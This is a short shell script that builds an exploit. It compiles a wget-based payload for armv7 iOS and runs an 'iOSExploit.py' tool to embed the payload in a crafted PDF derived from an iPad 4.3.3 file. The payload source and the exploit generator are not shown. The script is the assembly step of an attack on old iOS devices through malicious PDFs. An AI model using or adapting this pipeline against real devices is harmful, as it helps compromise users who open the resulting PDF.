#!/bin/sh

rm -f payload_wget exploit.pdf

gcc -L/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.2.sdk/usr/lib -I/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.2.sdk/usr/include -arch armv7 -mthumb payload_wget.c -o payload_wget

python iOSExploit.py iPad_4.3.3_8J2-3.pdf payload_wget exploit.pdf
